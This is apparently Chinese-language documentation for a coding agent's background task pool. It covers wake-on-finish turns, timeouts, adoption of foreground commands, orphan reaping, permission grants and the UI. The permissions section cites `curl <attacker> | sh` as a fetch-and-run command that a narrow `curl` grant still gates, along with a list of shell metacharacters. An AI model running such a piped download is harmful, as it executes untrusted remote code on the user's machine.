# 后台任务

`run_command` 通常会阻塞整个轮次直到命令退出，这让智能体在构建、测试套件、安装和批量下载过程中一直空等。把调用放入后台会把命令交给一个**会话级任务池**，并立即返回任务 id，于是智能体可以继续工作，稍后再收集结果。

![后台任务池：任务启动的三种方式、任务种类与状态、模型用来跟踪任务的工具，以及已完成任务如何通过拥有该会话的界面唤醒智能体](../../assets/diagrams/background-tasks.png)
*`Pool.Start`、`Pool.Adopt` 和 `Pool.Launch` 共用一条调度路径，而以 `notify_on_finish` 结束的任务会启动下一轮，除非模型已经收集了它的结果。*

## 模型可见的接口

| 工具 | 用途 |
|---|---|
| `run_command` 配合 `background: true` | 以分离方式启动命令；返回 `task_id` 而不是输出。 |
| `background_list` | 列出会话的每个任务及其状态、已用时间和估计。 |
| `background_output` | 捕获的 stdout 和 stderr，包括任务仍在运行时的输出（`tail_lines`，默认 100）。 |
| `background_wait` | 阻塞一段有界时间（默认 60s，最大 300s），并在任务结束后返回输出。 |
| `background_stop` | 终止任务及其启动的整个进程组，包括早先 coddy 运行遗留的进程。 |
| `background_reap` | 杀掉本会话中所有比启动它们的 coddy 运行存活更久的后台进程。 |

三个额外的 `run_command` 参数驱动任务池：

- **`background`**（bool）：以分离方式运行。
- **`expected_seconds`**（int）：模型自己对这项工作耗时的估计。它是**建议性**的：它驱动操作者看到的状态计时器，并在省略 `timeout_seconds` 时决定硬超时。估低了只会把任务标记为**逾期**；它绝不会提前杀掉任务。
- **`notify_on_finish`**（bool）：在此任务结束时唤醒智能体。对于后台命令、分离的子智能体以及在可用唤醒器时因前台超时而被接管的命令，它默认为 true。显式设为 false 可禁用唤醒（见下文）。

**模型在每次请求时都会被告知仍在运行的内容。** 模型启动一个任务，继续工作，若干步之后必须记得该任务存在，以及它启动的服务器在写总结时仍在运行。结束每次请求的轮次上下文块（[上下文压缩](compaction.md) 保持系统提示词冻结，因此会变化的内容放在历史之后）带有一个 `## Background tasks` 章节，每个正在运行的会话任务一行，采用 `background_list`（`bg_3 [running] make test (elapsed 2m5s, estimated 5m) silent for 1m10s`）的措辞。每个任务只花一行，却省掉了原本唯一能查明情况的 `background_list` 调用。已完成的任务和[系统任务](#系统任务)会被略去，而在 `tools.background.enable: false` 下该章节根本不会写入（`backgroundTasksSection` 在 `internal/agent/turn_context.go` 中）。

提示词（`internal/prompts/agent.md`，以及计划模式中的对应版本）告诉模型何时转入后台、如实估计、轮询而不是在 `background_wait` 上空转等待、停止它启动的服务器和监视器，并在总结结果前读取最终状态。后台执行在智能体模式和计划模式下**都**可用：调查仓库的计划者也不应该被迫干等一个缓慢的只读命令。

## 任务完成时唤醒智能体

长任务只有在无人值守时能于结束时重启对话才有用。因此，后台命令、分离的子智能体或被接管的前台命令在完成时会**自行启动一个新的智能体轮次**，这样模型可以在交办工作后结束自己的轮次。显式设置 `notify_on_finish: false` 可禁用此行为。

`background_wait` 返回已完成任务、`background_output` 在完成后读取，以及 `background_stop` 都会把其结果标记为已处理。这样的任务不会再启动一个轮次。任务仍在运行时读取输出不会抑制它最终的唤醒。彼此接近完成的任务会合并为一个轮次，且每会话唤醒上限仍然适用。

### 哪个进程唤醒智能体

每个运行轮次的进程都会向其任务池附加一个唤醒器，置于一个**带键**订阅之下（`bgtask.WakeWatcherKey`），因此重建某个界面会替换监视器，而不是再叠加一个：

| 进程 | 被唤醒的轮次在哪里运行 |
|---|---|
| 裸 `coddy`（控制台） | 在控制台里，在其自己的 UI goroutine 上运行，像手动输入的提示词一样：受门控的工具会打开权限弹窗 |
| `coddy acp` | 通过管理器运行，由编辑器作为发送方：更新落入编辑器打开的线程，受门控的工具也在那里询问 |
| `coddy serve` | 拥有该会话的界面（绑定到它的 Telegram 或 Pachca 聊天），否则是 HTTP 服务器；二者都未启动时则是管理器本身（见下文） |
| `coddy -p`、子智能体、调度运行 | 无处运行：没有任何东西会启动该轮次 |

**工具只承诺将会发生什么。** `run_command` 和 `spawn_agent` 会询问任务池是否有唤醒器已订阅（`Pool.CanWake`）以及会话是否根本能接受一个轮次。在能接受的情况下，结果会说 *完成后你会被唤醒并收到结果*，任务记录 `notify_on_finish`；在不能接受的情况下，结果会说明没有任何东西会唤醒模型，并改为列出 `background_list`、`background_wait` 和 `background_output`，且任务不会记录它实际上得不到的唤醒。子任务或调度运行的对话记录在其轮次返回时被封存，因此在那里启动的任务永远不会唤醒任何东西。

### 被唤醒的轮次是什么样

被唤醒的轮次从一段对结果的平实陈述开始，这就是模型读到的东西：每个任务及其 id、状态、标签、退出码、运行时间和任何错误，持有详细信息的工具（`background_output`），以及提醒：失败、超时或被停止的任务并未成功。对于未完成的子智能体运行，它还会指出带有 `resume` 的 `spawn_agent` 调用，以继续同一个子任务（[恢复运行](subagents.md#恢复运行)）。

没有人输入过那条消息，也没有任何界面把它显示得像有人输入过一样。被唤醒轮次的第一条消息会带标记持久化，即 `background_wake`，位于 `messages.json` 中和 `GET /coddy/sessions/{id}/messages` 中，也就是任务及其结果；并且在写入消息之前，该轮次会以一个 `background_wake` 会话更新开头，因此在这两者之间重新加载的客户端只会看到一次唤醒。轮次开始时，任务池会将其任务标记为已唤醒智能体（任务行上的 `woke_agent`，保存在任务记录中）。

当任务列表位于对话旁边时，被唤醒的轮次本身不显示任何内容，读起来就像智能体在继续：

- **Web 界面**：用户气泡的位置没有内容，回答接在上一轮之后；任务卡片保留它的铃铛（[哪些任务会唤醒智能体](#哪些任务会唤醒智能体)）。唤醒仍然算作一个轮次：对后续消息的编辑和其后的回退按服务器编号方式编号，失败的被唤醒轮次不提供重试，因为没有输入过任何可再次发送的内容。
- **控制台**：同样如此，实时时以及 `/resume` 重放会话时都是如此；`/tasks` 中该任务的行会显示 `woke the agent`。

纯文本界面在聊天旁边没有任务列表，因此会有一行文字说明是什么唤醒了智能体，即用文字表达的结果：

- **ACP**：`background_wake` 会话更新，随后是给仅渲染标准更新的编辑器看的一行引用智能体文本，*被已完成的后台任务唤醒：bg_3 make test，失败，退出码 2，1m 30s*；`session/load` 以同样方式重放它。
- **Telegram**：回答上方有一条独立消息，*🔔 被已完成的后台任务唤醒：bg_3 make test，失败，退出码 2，1m 30s*。

### 在 `coddy serve` 下

进程拥有唤醒器（`serve.Runtime`），无论启用了哪些界面，被唤醒的轮次都会交给应当运行它的界面：

1. **绑定到该会话的 Telegram 或 Pachca 聊天。** 该轮次运行得完全像此人发送的一条消息：使用聊天自己的发送方，并镜像到 HTTP 中继，以便正在观察该会话的浏览器能够跟随。无论 HTTP 服务器是否运行，聊天都会收到关于唤醒的那一行，然后是回答。权限语义遵循该聊天：聊天中的智能体所请求的内容会被允许，子智能体则在聊天中被询问。
2. **HTTP 服务器。** 该轮次通过会话的输入框中继运行，因此 Web 界面和通过 `--remote` 附加的控制台都能跟随它。其权限提示是**被询问**的，而不是被拒绝：提示会进入中继，并作为会话的待处理提示持久化，Web 界面会显示它（并在重新加载后恢复它），随后附加的控制台会在其弹窗中显示它，而通过 `POST /coddy/sessions/{id}/permission` 给出的第一个回答会解决它。它会像浏览器轮次中标签页被关闭后的提示词那样等待。被唤醒轮次内部的问题仍会被拒绝：没有任何东西会为稍后到达的客户端持久化问题。
3. **无人接管。** 两个界面都未启动时（只运行调度器的 `coddy serve`，或其聊天已转移到另一会话的机器人），运行时仍会通过管理器运行它承诺的轮次，对话记录会为下一个打开该会话的人保留结果。其中的受门控工具调用会被**拒绝**，除非会话在 `bypass` 中运行：没有界面能够回答。

`GET /coddy/events` 会把被唤醒的轮次宣告为 `background_wake`，并带上任务。通过 `--remote` 附加的控制台只读取它自己启动的轮次，因此它就是这样得知有一个值得跟随的轮次：它会附加到会话的输入框中继并渲染该轮次，包括回答和权限提示；如果 Web 界面先回答，它会再次撤回该提示。如果在这样的轮次已经运行时打开会话的控制台（它在任务结束时是关闭的），会从 `GET /coddy/sessions/{id}/activity`（`backgroundWake`）得知此事，并从其加载的对话记录结束处跟随该轮次，因此等待某人的提示会在那里得到回答；连接断开后，事件流的快照会再次宣告唤醒，控制台会在其显示过的最后一帧之后接上同一个轮次。

### 时序与限制

- **一起完成的任务只花费一个轮次。** 一个短暂的稳定窗口会把突发合并，因此三个结果会作为一个轮次、三行内容到达，而不是三个轮次。
- 该轮次会获取**输入框轮次锁**，该锁会拒绝而不是排队：已有轮次在执行的会话会立即回答 `ErrSessionTurnBusy`。因此等待是唤醒器的职责：它会**重试同一批任务**（1 s，翻倍直到上限 15 s），直到会话空闲，然后才启动轮次。HTTP 服务器会在注册被唤醒轮次的中继之前获取该锁，因此被拒绝的尝试绝不会切断正在运行的轮次的监视器。
- **在自身轮次内就死掉的任务仍然会被报告。** 这是普通情况，而不是罕见情况：模型启动一个任务，继续说话，而任何在最初几秒内失败的东西都会在启动它的轮次仍然打开时完成。结果会等待该轮次，并在其后到达，而不是被丢弃。等待期间完成的任何东西都会加入同一批，因此一个长轮次仍然只花费一次唤醒。轮次永不结束的会话会在 30 分钟后放弃并记录 `background_wake_abandoned`；其他所有轮次失败都会记录为 `background_wake_failed` 且不重试，因为那只会空转。
- **控制台会为它未显示的会话保留唤醒。** 操作者用 `/new` 或 `/resume` 离开的会话中的任务，会等待他们回到该会话，即唤醒器的忙碌重试，并且控制台会说明一次它正在何处等待。
- **关闭不会唤醒任何东西。** 排空会停止正在运行的任务，而停止是终结性的；没有这道保护，每个被关闭杀死的任务都会启动一个没人会读的轮次。
- 被唤醒的轮次可以启动另一个会通知的任务，这既是无人值守工作的合理模式，也可能让一整夜的 token 在循环中烧掉。`maxWakesPerSession`（每进程 50，`internal/agent/background_notify.go`）是兜底；达到它就会停止启动轮次并记录 `background_wake_capped`。预算只计算实际运行过的轮次：被忙碌会话或关闭拒绝的尝试会退还，因此等完一个长轮次不会耗尽它。

### 哪些任务会唤醒智能体

一个将在结束时启动轮次的正在运行任务，会在所有列出它的地方说明这一点：任务面板中其卡片标题后的**铃铛**（悬停：*结束时唤醒智能体*）、控制台 `/tasks` 中其行内的 `wakes the agent`，以及 `background_list` 和轮次上下文中的 `wakes you when it ends`，这样模型就不会花一个轮次去等待一个它会因此被唤醒的任务。

已完成任务在其结束确实启动了轮次时会保留该标记：铃铛留在其卡片上（悬停：*结束时唤醒了智能体*），并且其在 `/tasks` 中的行会显示 `woke the agent`。Web 界面和控制台会在那里说明是什么唤醒了智能体，因为被唤醒的轮次本身不显示任何内容。本应唤醒智能体但尚未唤醒的任务（轮次尚未开始，或因进程消失而永远不会开始），在结束后不会带有标记。

![任务面板：正在运行的构建带有铃铛，将会唤醒智能体；失败的测试运行也带有铃铛，它已经唤醒过智能体](../../assets/background-tasks/background-tasks-wake-bell-dark-1280.png)

*失败的测试运行唤醒了智能体，对话记录只是接着给出它的回答；仍在运行的构建会再次唤醒它*

实现：`internal/agent/background_notify.go`（`BackgroundWaker`、`Wake`、`WakeInstruction`）、`internal/serve/wake.go`（`coddy serve` 下的进程所有者）、`Server.RunBackgroundWake`（`external/httpserver/background_http.go`）、`Bot.RunBackgroundWake`（`external/gateway/telegram/wake.go`）、`App.attachBackgroundWaker`（`external/cli/background.go`）、`acpWakeRunner`（`cmd/coddy/acp_wake.go`）以及 `internal/remote/follow.go` 的跟随器。设计记录：`docs/plans/background-wake.md`。

## 超时

任务始终有一个硬限制，按以下顺序解析：

1. 显式的 `timeout_seconds` 优先，包括刻意设得很紧的值；
2. 否则声明的 `expected_seconds` 会换来其自身的 **3×**，下限为 **60s**，以免过度乐观的估计杀掉只是稍慢的工作；
3. 否则为 `tools.background.default_timeout_seconds`（900s）。

结果由 `tools.background.max_timeout_seconds`（3600s）封顶。达到限制会终止进程组并把任务记录为 `timed_out`，这是失败而不是成功，模型会被告知要这样报告。

**被接管的**任务（见下文）是唯一没有调用方提供限制的情况：它直接获得 `max_timeout_seconds`。它背后没有估计，而绝不能复用的数字正是它刚刚超出的前台超时：显式的 `timeout_seconds` 会原样优先，因此传入已过期的值会在几毫秒内杀掉任务。

## 接管：超出其超时的前台命令

前台 `run_command` 默认等待 30 秒。此时杀掉仍在运行的任何东西有双重错误：开发服务器或监视器正在做被要求的事，而 shell 生成的任何东西在只针对 shell 的 kill 下仍会存活，同时仍持有继承的输出管道，这过去会让 `cmd.Wait` 永久卡住并挂起整个轮次。

因此命令会被**交给任务池而不是杀掉**。进程继续在同一个进程组中运行，其输出流被重定向到任务的输出汇中，并首先刷入目前捕获的所有内容，然后工具回答：

```
Command still running after 30s. It was NOT cancelled: it now runs as background task bg_3 (hard timeout 1h).
Follow it with background_output task_id="bg_3", background_wait, or terminate it with background_stop.
Do NOT run this command again with a larger timeout_seconds: it is already running, and a second copy would fight the first one for the same ports, locks and files.
Output captured so far:

  App running at:
  - Local:   http://localhost:8081/
```

通知在前，输出在后，因为工具输出上限会从末尾截断。结果是普通工具结果，而不是错误：智能体循环会向模型显示错误文本并丢弃结果字符串，因此把超时报告为错误正是丢弃捕获输出的原因。

从此以后该任务就是普通任务：`background_list`、`background_output`、`background_wait`、`background_stop` 都能访问它。在可用唤醒器时，它默认会在完成时唤醒智能体，除非调用设置了 `notify_on_finish: false`；其已用时间从原始前台启动时算起，而不是从交接时算起。

在没有任何东西能接管所有权的三种情况下，命令**会**被终止，包括进程组和所有内容：轮次被取消、未接入任务池，或任务池拒绝（`tools.background.enable: false`、会话处于 `max_concurrent`、进程正在排空）。此时回答会指出确切原因并指向 `background: true`。

实现：`Pool.Adopt`（`internal/bgtask/pool.go`）与 `Pool.Start` 共用单条调度路径；shell 侧是 `internal/tools/shell/foreground.go` 中的 `startForeground` 和 `adoptedHandle`，由 `switchWriter` 持有输出直到任务池接管。每条命令恰好存在一个 `cmd.Wait`：任务池观察同一个结果，而不是再次调用它。

已知限制：被接管的命令会继续通过 `exec` 为前台运行创建的管道写入，而该管道只会在 `cmd.Wait` 返回之前被排空。如果命令分离出一个守护进程，然后其 shell 退出，`WaitDelay` 会在五秒后关闭管道，任务会以 shell 的退出码记录为已完成；守护进程继续运行，但它在此时之后打印的任何内容都会丢失。这个取舍是刻意的：没有 `WaitDelay`，等待会像最初的 bug 那样挂在继承的管道上。将服务器保持在 shell 前台运行的命令（开发服务器默认如此）不受影响。

## 输出在读取时清理

捕获的字节会原样存储在 `output.log` 中；转义序列和回车进度重绘会在输出被**读取**时剥离（`platform.SanitizeOutput`，应用于 `bgtask.decodeOutput`，并由 `run_command` 自身处理）。否则 webpack 或 vue-cli 构建会把大部分输出花在 `\x1b[2K\x1b[1A` 重绘上，而真正重要的那一行会被埋在其中。读取时剥离可让磁盘上的日志保持忠实记录，并避免破坏跨越两次写入的转义序列。

## 生命周期与持久化

任务池**运行在正在运行的 `coddy` 进程内部**。每个任务都会把其元数据和捕获的输出镜像到会话包中：

```
<sessionDir>/background/<task_id>/meta.json
<sessionDir>/background/<task_id>/output.log
```

`meta.json` 还携带进程组领导者 pid，并在 Windows 上把其精确的操作系统创建时间作为 `process_started_at`。该身份是私有的持久化元数据，而不是 HTTP 任务行的一部分：它存在的唯一目的，是让后续的 coddy 能够证明被复用的 pid 不属于另一个进程。

内存中的输出窗口是有界的（`tools.background.output_buffer_bytes`，256 KiB），因此话多的任务不会无限增长；磁盘上的日志会保留所有内容。读取持久化日志时上限为其最后 256 KiB，因此运行了一天的监视器不会被整体拉入内存；响应会标记截断。

- **服务器排空**和**会话删除**会终止受影响范围内的每个正在运行任务，因此关闭 coddy 不会留下孤立的 shell 进程树。
- **重启之后**，记录为仍在执行的任务会被报告为 **`orphaned`**，而不是永远运行。该修正在每次读取时派生，并且刻意**不**写回：HTTP 列表会被轮询，重写会覆盖此进程中仍在运行的任务的元数据，并与监督器对同一文件的写入竞争。id 计数器会从会话包已有内容之后继续，因此新任务永远不会覆盖上一进程中同名任务的日志。

状态：`queued`、`running`、`succeeded`、`failed`、`timed_out`、`stopped`、`orphaned`。

## 卡住与遗留进程

两个不同的问题，两种不同的答案。

**卡住**：任务正在运行但什么也没做。从外部无法知道这一点，因此任务池报告它唯一拥有的事实：任务已经多久没有产生输出。`background_list` 会在一分钟安静之后把正在运行的任务标记为 `silent for …`。这是提示，不是裁决：`sleep`、开发服务器和监视器本来就都应该安静。模型读取命令，做出决定，并调用 `background_stop`。硬超时仍然是无人查看时的兜底。

**遗留**：进程比启动它的 coddy 运行存活更久，因为那次运行是被杀死而不是排空。任务记录会持久化**进程组领导者 pid**，因此新的 coddy 可以区分进程已消失的记录（报告为 `orphaned`）与进程仍在本机上的记录。`background_list` 会把那些标记为 `still alive from an earlier run`，`background_stop` 可按 id 访问一个，`background_reap` 会一次性杀掉该会话的所有这类进程。

只有在其进程死亡时仍声称处于**运行中**的记录，才会成为回收候选。正常完成的任务会留下过期 pid，而操作系统会复用 pid；对其中一个采取行动会杀掉无关进程。

其背后的探测必须回答**“此任务的进程是否仍在运行”**，而不是“是否有东西应答这个编号”，而两个平台需要不同的工作才能做到：

- 在 unix 上，向**进程组** `-pid` 发信号已经同时完成两项检查：已退出的任务会留下空组（`ESRCH`），而复用的 pid 只有在同时也领导一个组时才会匹配，这在很大程度上缩小了复用范围，但没有完全排除。改为检查领导者的启动时间会打开更糟的漏洞：组比其领导者存活更久，而一个已退出但其子进程继续运行的领导者，正是值得寻找的幸存者。
- Windows 没有可比的组探测，而显而易见的替代方案（按 pid 打开进程）在两个方向上都是错的。只要有人持有句柄，进程**对象**就比进程本身存活更久（而且 `os.FindProcess` 每次探测都会打开一个句柄，因此探测本身让尸体保持可解析）；而按编号打开会匹配**任何**进程，没有组领导者要求来过滤 pid 复用。因此 Windows 探测会以零超时询问 `WaitForSingleObject`，这能区分正在运行的进程与保留的尸体，然后要求其精确的**创建时间**等于任务启动时从 Windows 捕获的 `process_started_at`。缺失或不可读的身份会按失败关闭处理。

证明身份然后按编号杀死，仍会在两者之间留下窗口，因此在 Windows 上，杀死操作会重新打开 pid，重新检查创建时间，并**在整个 `taskkill` 期间保持该句柄打开**。只要其进程对象的任何句柄打开着，Windows 就会保持 pid 已分配，因此在这期间没有任何东西能继承该编号，而 `taskkill /T` 仍会解析将其命名为父进程的子进程。那里刻意不要求存活：已经退出的领导者可以有正在运行的子进程，而那些才是重点。

这种比较正是回收永远不需要操作者提供新 pid 的原因：记录携带了证明 pid 仍然意味着它曾经意味的东西所需的一切。

**升级**：在 `process_started_at` 存在之前写入的记录携带 pid 而没有身份。在 Windows 上它们再也无法被证明，因此不会被列为遗留，`background_reap` 也不会碰它们，这是同一规则的失败关闭一侧。如果这样的运行确实留下了进程，请从操作系统杀死它并删除过期的会话包。Unix 不受影响：其探测从未消费该身份。

刻意**没有**工具可以杀死任意 pid。`run_command` 已经可以运行 `kill`，而且它会经过权限门控；专用工具会绕过这一点。

## 权限

后台命令与前台命令经过同一权限门控：转入后台并不是绕过批准的方式。因为一批仅在参数上不同的调用否则会每次调用都询问一次，对话框在 **允许** / **始终允许** / **拒绝** 旁边提供第四个选择：

**始终允许 `<program>`** 会把授权从精确命令扩大到程序本身。按钮会指明将要存储的确切允许列表条目，因此操作者批准的是实际保存的字符串：

- `curl -s https://example.com/a` → 授予 **`curl`**，它随后涵盖带任意参数的 `curl`；
- `git status --short` → 授予 **`git status`**，因为对于多路复用器（`git`、`go`、`npm`、`docker`、`make`、`kubectl`……），第一个参数决定实际发生什么；`git push` 仍会询问。

扩大授权**仅**提供给单个普通调用。任何携带 shell 元字符（`| & ; < > $( ) backtick * ? [ ] { } ! # ~ % @`、换行符）或以 `VAR=` 赋值开头的命令都会保留窄授权。`Allow always` 保持其原始含义；更宽的授权绝不会被隐含。

授权是会话级的（`internal/session.State.PermissionCommandGrants`）。匹配刻意比操作者编写的 `tools.command_allowlist` 更严格：会话授权只会涵盖本身是单个普通调用的候选命令。尾随参数一如既往仍被涵盖，但追加 shell 机制则不会：即使有 `curl` 授权，`curl <attacker> | sh` 也会再次询问。操作者自己的 `tools.command_allowlist` 仍会涵盖条目的任意参数，而一行中的多个命令只有在每个命令都是条目时才被涵盖（[安全与信任](../operate/security.md#权限模式与提示) 有其规则）。

## HTTP 接口

| 方法 | 路径 | 用途 |
|---|---|---|
| `GET` | `/coddy/sessions/{id}/background-tasks` | 任务行外加一个 `running` 计数。 |
| `GET` | `/coddy/sessions/{id}/background-tasks/{task_id}` | 单个任务及其捕获的 `output`（可选 `?tail=N`）。 |
| `POST` | `/coddy/sessions/{id}/background-tasks/{task_id}/stop` | 终止任务；返回最终行和输出。 |

行包含原始快照以及服务器计算的 `elapsed_seconds`、`overdue` 和 `running`，因此每个客户端在时钟运算上都能达成一致。由较早进程记录的任务会从会话包中作为 `orphaned` 合并进来。

SPA **轮询**这些端点，而不是监听 SSE：后台任务比启动它的轮次的流存活更久。有任何任务运行时节奏为 2.5s，否则为 15s。

## 界面

面板**停靠在会话内部**，位于对话记录右侧，地址为 `#/s/<sessionId>/tasks`（单个任务为 `#/s/<sessionId>/tasks/<task_id>`）。路由携带聊天，因此重新加载会同时恢复对话和面板。这个位置回答了“哪个会话生成了这个进程”：面板是启动这些任务的对话的一部分，因此没有什么需要标注。

- **每个任务都是同一张卡片**，无论它是什么、正在运行还是已经完成：一个状态点，一个说明其背后是什么的**标签**（命令为 `shell`，子智能体运行为智能体名称，委派给[记忆子智能体](memory.md)为 `memory`，预览服务器为 `server`），标题（命令，或智能体被要求做的事），以及其下的一行：它何时开始、已运行多久相对于估计（`12:49 · 1m 28s`），然后完成后还显示何时结束（`12:49 · 20s · 12:50`），若是另一天则前面带日期；悬停卡片会显示完整的开始和结束时间、日期和秒数。当标题已经以标签名称开头时，标签会被省略，因此名称只写一次：调度运行卡片只以其任务为标题，而运行如何以及何时启动则在悬停文本中。未命名任何智能体的智能体运行也不带标签。任务如何结束由点的颜色表示；卡片只在打开时用文字说明。子智能体运行（委派，包括对记忆子智能体的委派）和调度运行还会在该行右侧标明它们运行的模型、当模型有级别时它们调用该模型时使用的推理级别，以及它们的调用已消耗的 token（`qwen3.8-27b · High · 212k tokens`），并在运行期间更新；悬停卡片会显示完整模型 id 以及分开的输入和输出 token。正在运行的卡片会增加一个停止控件、任务结束时将唤醒智能体时位于标题后的**铃铛**（悬停：*结束时唤醒智能体*），并且**仅**在模型提供了估计时增加进度条；已完成卡片在其结束确实唤醒了智能体时保留铃铛（悬停：*结束时唤醒了智能体*）。正在运行的任务位于面板顶部，不带标题；**已完成 N** 计数器之上的任何内容都是正在运行。
- **点击卡片任意位置会在原处打开它。** 没有第二个窗格：打开的卡片会显示带有复制按钮的命令（智能体运行和预览服务器背后都没有 shell，那里不显示任何内容）、运行以错误结束时的错误（不是命令裸露的 `exit status 2`，那只会重复退出码）、位于可自行滚动框中的捕获输出，以及底部的任务结束方式和退出码（`Failed · Exit code 2`；智能体运行和预览服务器背后没有进程，因此它们的该项只说明结果）。它运行了多久以及预览服务器的地址留在卡片自己的行上，无论卡片是否打开都能读到，子智能体运行的**显示对话记录**也是如此，它是折叠卡片上的文本链接，可在不打开卡片的情况下打开子聊天。想打开多少卡片就打开多少：每张卡片都会在其任务运行时继续读取自己的输出。哪些卡片打开不是地址的一部分，地址只说明面板正在显示。
- **在桌面宽度的窗口中，面板会跟随聊天。** 打开它，然后在历史中选择其他聊天：面板保持打开并显示每个所选聊天的任务，点击历史之外以关闭历史时面板仍保持打开。在平板或手机上，面板是全屏的，打开历史会关闭它，和以前一样。
- **已完成 N** 是一个计数器，而不是列表。展开它会显示已完成的卡片；其余内容留在磁盘上。这就是“保留每个日志”和“不要加载整个应用”如何同时成立：列表只计数，卡片按需渲染，任务的输出只在其卡片被打开时获取。
- **清除**会丢弃此会话的已完成历史（`DELETE /coddy/sessions/{id}/background-tasks`）。正在运行的任务不受影响。
- 排序**纯粹按启动时间**，最新在前，在活动卡片中和已完成历史内部都是如此。正在运行的任务不会浮到历史顶部：它们已经站在计数器之上，而混合两种排序会造出一个永远无法静下来阅读的列表。
- **打开器**是聊天标题栏右边缘的 **任务** 控件。标题栏是粘性的，因此控件不会随对话记录滚走，并且从第一条消息起就在那里：尚未运行任务的聊天显示其点和文字 `Tasks`，运行过的聊天显示点和“正在运行多少 / 总共有多少”（`1 / 3`，然后全部完成后为 `0 / 3`），在每个宽度下都是如此；名称在工具提示中。点击会打开面板，再次点击会关闭。轮次运行时，[实时状态行](../surfaces/web-ui.md#输入点旁边的实时状态) 也会列出正在运行的任务，名称是指向同一面板的按钮。两个数字都不计入[系统任务](#系统任务)，即运行时自行启动的运行；对记忆子智能体的委派是普通智能体任务，会被计入。该控件刻意不放在导航栏中：后台任务属于一个聊天。

![从聊天标题栏控件打开的“任务”面板：两张正在运行的卡片，以及一个在原处打开的已完成命令](../../assets/background-tasks/background-tasks-header-opener-dark-1280.png)

*从聊天标题栏控件打开的“任务”面板：一个仍在运行的子智能体和一个仍在运行的命令，以及一个在原处打开的已完成构建，显示其命令、输出和退出码*
- 启动任务的对话记录工具行会称自己为后台运行，并在普通行显示持续时间的位置显示任务的计时，无论折叠还是展开；它本身不携带任务控件。它不说明运行如何结束：状态、估计、退出码和错误会在面板中该任务的卡片上读取，该卡片由 **任务** 控件打开，并且任务运行时该卡片带有停止。

- 智能体被唤醒进入的轮次本身不显示任何内容，既没有用户气泡也没有注释：回答接在上一轮之后，而任务卡片上的铃铛说明是什么唤醒了智能体（[唤醒智能体](#被唤醒的轮次是什么样)）。

布局、颜色和移动端契约位于 `DESIGN.md`（**后台任务面板**、**对话记录行上的后台任务**、**被唤醒的轮次**）。

## 在控制台中

智能体通过其工具访问任务池；操作者通过 `/tasks` 访问它，这会在编辑器的位置打开会话的任务（[控制台](../surfaces/console.md#命令与按键)）。一行会以相同顺序、最新在前，说明 Web 界面卡片所说的同样三件事：标签（`shell`、智能体名称、`memory`）、标题、任务进展如何。**enter** 打开任务：命令、智能体运行的子会话、它以之结束的错误、输出的最后几行，任务运行时还会重新读取。**s** 停止正在运行的任务及其启动的一切，**r** 重新读取，**escape** 返回。

轮次运行时，状态行会计数正在运行的任务（`2m 05s · 1.2k tokens · 1 running task · Responding`），轮次结束后，页脚会保留该计数以及列出它们的命令（`1 task running (/tasks)`），因为后台任务比启动它的轮次存活更久。两个计数都不包含[系统任务](#系统任务)。

控制台通过其后端的三个方法读取任务：`session.Manager` 从本进程的任务池和较早进程的会话包中回答（`bgtask.Pool.SessionTasks`，与 HTTP 行使用的读取相同），而在 `--remote` 下，`remote.Handler` 从上述三个 REST 路由回答，因此覆盖层会列出并停止智能体所运行服务器上的进程。无法到达的服务器会让最后几行留在屏幕上：无法到达不是“没有任务”。

![控制台的 /tasks 覆盖层列出一个正在运行的命令](../../assets/cli-tui/15-tasks-overlay.png)

*控制台中的 `/tasks`：一个正在运行的命令、其标签、相对于估计的计时*

## 配置

参见 `docs/reference/config.md` 中的 `tools.background`：

```yaml
tools:
  background:
    enable: true
    max_concurrent: 5
    default_timeout_seconds: 900
    max_timeout_seconds: 3600
    output_buffer_bytes: 262144
```

设置 `enable: false` 会从 `run_command` 中移除 `background` 选项，并且完全不注册后台工具。子智能体运行（`docs/features/subagents.md`）位于同一任务池中，因此 `max_concurrent`、`max_timeout_seconds` 和 `output_buffer_bytes` 也会限制它们；`subagents.*` 增加进程范围子运行上限、嵌套深度和默认运行超时。

## 预览服务器

第三种任务既不是命令也不是智能体运行：`kind: server` 是 `preview_server` 工具在项目目录上启动的静态文件服务器（[预览服务器](preview-server.md)）。它是 Coddy 进程的 goroutine，通过与子智能体运行相同的回调启动，因此它没有 pid，没有值得显示的退出码，崩溃后也没有任何东西可供 `background_reap` 查找。其行携带 `url`，即它应答的地址：服务器运行时，任务面板会把它作为链接显示在卡片本身上，无需先展开；`/tasks` 显示同一行，`background_list` 在标签后打印地址，`background_output` 是请求日志。

它也是唯一没有硬限制的任务种类。操作者要求保持打开的页面没有可估计的持续时间，因此任务池不会为它设置计时器，`timeout_seconds` 读取为 `0`；只有 `preview_server` 调用本身的 `timeout_seconds` 会提前结束它，原样且不受 `max_timeout_seconds` 封顶。安静的服务器永远不会被标记为 `silent for …`。其他一切都是普通生命周期：它会计入 `max_concurrent`，`background_stop` 和停止按钮会结束它，删除会话或排空进程会将其关闭，而死亡进程留下的 `running` 记录会以 `orphaned` 回来。

## 系统任务

运行时代表自己而不是根据模型委派启动的任务，目前只有[会话监督器](session-supervisor.md)的验证器，是一种 `kind: agent` 任务，其 `agent` 对象携带 `system: true`。它会被允许越过 `tools.background.max_concurrent`，并且从不计入其中，因为该上限约束的是模型启动的工作，而模型从未要求的运行否则会拒绝模型的下一条命令；面向模型的工具（`background_list`、`background_output`、`background_wait`、`background_stop`）会省略它并拒绝其 id，而 REST 行和任务面板会显示它。排空会像任何任务一样停止它，但会为仍在持久化的运行留出宽限。记忆子智能体（[长期记忆](memory.md)）**不是**其中之一：模型通过 `spawn_agent` 委派给它，因此其运行是普通的 `agent` 任务，像其他任务一样被计数并可见。

## 子智能体运行

任务池刻意对 shell 一无所知。任务*是*什么由启动它的人决定：shell 命令使用 `CommandRunner`，而任务池无法描述为命令的工作则使用启动回调：

```go
type Handle interface {
	Wait() (exitCode int, err error)
	Stop(grace time.Duration) error
	PID() int
	ProcessStartedAt() time.Time
}

type LaunchFunc func(taskID string, out io.Writer) (Handle, error)
```

